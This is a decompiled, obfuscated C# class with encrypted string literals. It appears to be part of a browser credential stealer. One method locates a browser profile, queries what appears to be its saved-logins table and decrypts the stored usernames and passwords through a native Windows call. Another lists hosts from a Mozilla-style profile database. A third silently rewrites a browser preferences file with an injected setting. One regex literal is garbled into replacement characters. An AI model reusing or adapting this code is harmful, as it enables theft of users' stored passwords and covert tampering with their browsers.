using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

internal class Class21
{
	public static List<Class18> smethod_0()
	{
		List<Class18> list = new List<Class18>();
		Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		IEnumerator enumerator = null;
		IEnumerator enumerator2 = null;
		bool flag = false;
		_ = Class12.smethod_15() + _003CModule_003E.smethod_0("㜉㜘㜺㜯㜼㜹㜹㜴㝵㜓㜼㜧㜰㜳㜺㜭㜉", 866133);
		string text = null;
		string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("匎匟匟匋匎匛匎", 217935)) + _003CModule_003E.smethod_0("麵麤麆麓麀麅麅麈麵麯麀麛麌麏麆麑麵麹麛麆麏麀麅麌麚", 171753));
		foreach (string text2 in directories)
		{
			text = text2;
			if (flag)
			{
				break;
			}
			string text3 = null;
			string[] files = Directory.GetFiles(text);
			foreach (string text4 in files)
			{
				text3 = text4;
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(text3, _003CModule_003E.smethod_0("ᴿᴥᴫᴢᴣᴢᴿᵢᴿᴽᴠᴥᴸᴩ", 400716)))
				{
					Class16.smethod_0(text);
					Class16.string_0 = text3;
				}
			}
		}
		string string_ = Class16.string_0;
		Class16.Struct1 struct1_ = default(Class16.Struct1);
		Class16.Struct1 struct1_2 = default(Class16.Struct1);
		Class15 @class = new Class15(string_);
		DataTable dataTable = @class.method_2(_003CModule_003E.smethod_0("ᱱᱧᱮᱧᱡᱶᰂᰈᰂᱤᱰᱭᱯᰂᱏᱍ᱘ᱽᱎᱍ᱅\u1c4b\u1c4c᱑ᰙ", 662562));
		DataTable dataTable2 = @class.method_2(_003CModule_003E.smethod_0("匢匴匽匴匲匥卑卛卑匷匣匾匼卑匜匞匋匮匕匘匂匐匓匝匔匕匹匞匂包匂半", 545649));
		try
		{
			enumerator = dataTable2.Rows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				_ = (DataRow)enumerator.Current;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		Class16.smethod_2(Class16.smethod_3(), bool_0: true, 0L);
		try
		{
			enumerator2 = dataTable.Rows.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				Class18 class2 = new Class18();
				byte[] array = null;
				DataRow dataRow = (DataRow)enumerator2.Current;
				string text6 = (class2.String_2 = Convert.ToString(dataRow[_003CModule_003E.smethod_0("쫡쫨쫵쫪쫔쫲쫥쫪쫮쫳쫒쫕쫋", 313991)].ToString()));
				StringBuilder stringBuilder = new StringBuilder(dataRow[_003CModule_003E.smethod_0("\u1038\u1033\u103e\u102fဤ\u102dဩ\u1038\u1039ဈ\u102e\u1038\u102f\u1033\u103c\u1030\u1038", 594013)].ToString());
				int value = Class16.smethod_1(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
				IntPtr ptr = new IntPtr(value);
				Class16.Struct1 struct1_3 = (Class16.Struct1)Marshal.PtrToStructure(ptr, typeof(Class16.Struct1));
				if (Class16.smethod_4(ref struct1_3, ref struct1_, 0) == 0 && struct1_.int_2 != 0)
				{
					array = new byte[struct1_.int_2 - 1 + 1];
					ptr = new IntPtr(struct1_.int_1);
					Marshal.Copy(ptr, array, 0, struct1_.int_2);
					class2.String_0 = Encoding.ASCII.GetString(array);
				}
				StringBuilder stringBuilder2 = new StringBuilder(dataRow[_003CModule_003E.smethod_0("熀熋熆熗熜熕熑熀熁熵熄熖熖熒熊熗熁", 684517)].ToString());
				int value2 = Class16.smethod_1(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
				ptr = new IntPtr(value2);
				Class16.Struct1 struct1_4 = (Class16.Struct1)Marshal.PtrToStructure(ptr, typeof(Class16.Struct1));
				if (Class16.smethod_4(ref struct1_4, ref struct1_2, 0) == 0 && struct1_2.int_2 != 0)
				{
					array = new byte[struct1_2.int_2 - 1 + 1];
					ptr = new IntPtr(struct1_2.int_1);
					Marshal.Copy(ptr, array, 0, struct1_2.int_2);
					Encoding.ASCII.GetString(array);
					class2.String_1 = Encoding.ASCII.GetString(array);
				}
				list.Add(class2);
			}
			return list;
		}
		finally
		{
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	public static List<string> smethod_1()
	{
		List<string> list = new List<string>();
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("㨫㨺㨺㨮㨫㨾㨫", 342634)) + _003CModule_003E.smethod_0("떰떡떃떖떅떀떀떍떰떪떅떞떉떊떃떔떰떼떞떃떊떅떀떉떟", 833004);
		string string_ = text;
		if (!Directory.Exists(text))
		{
			return list;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("寗寋密寄寂寔安寔寖寋寎寓寂", 351143))
				{
					text = text2;
					string_ = text3;
				}
			}
		}
		Class16.smethod_0(text);
		Class15 @class = new Class15(string_);
		DataTable dataTable = @class.method_2(_003CModule_003E.smethod_0("\uecb2\ueca4\uecad\ueca4\ueca2\uecb5\uecc1\ueccb\uecc1\ueca7\uecb3\uecae\uecac\uecc1\uec8c\uec8e\uec9b\uecbe\uec91\uec8d\uec80\uec82\uec84\uec92", 257249));
		foreach (DataRow row in dataTable.Rows)
		{
			list.Add(row[_003CModule_003E.smethod_0("콪콭콳", 446239)].ToString());
		}
		return list;
	}

	public static void smethod_2(string string_0)
	{
		string text = Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("鞲鞣鞣鞷鞲鞧鞲", 301043)) + _003CModule_003E.smethod_0("ݦݷݕ\u0740ݓݖݖݛݦݼݓ\u0748ݟݜݕ\u0742ݦݪ\u0748ݕݜݓݖݟ\u0749", 722746);
		string path = text;
		if (!Directory.Exists(text))
		{
			return;
		}
		string[] directories = Directory.GetDirectories(text);
		foreach (string text2 in directories)
		{
			string[] files = Directory.GetFiles(text2);
			foreach (string text3 in files)
			{
				if (Path.GetFileName(text3) == _003CModule_003E.smethod_0("ꐄꐆꐑꐒꐇꑚꐞꐇ", 500852))
				{
					text = text2;
					path = text3;
				}
			}
		}
		string text4 = File.ReadAllText(path);
		text4 = text4.Replace(Regex.Match(text4, _003CModule_003E.smethod_0("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd", 777696)).ToString(), string.Format(_003CModule_003E.smethod_0("缨缮缸缯缂缭缯缸缻罵罿缿缯缲缪缮缸缯罳缮缩缼缯缩缨缭罳缵缲缰缸缭缼缺缸罿罱罽罿缦罭缠罿罴罦", 425821), string_0));
		try
		{
			File.WriteAllText(path, text4);
		}
		catch (Exception)
		{
		}
	}
}
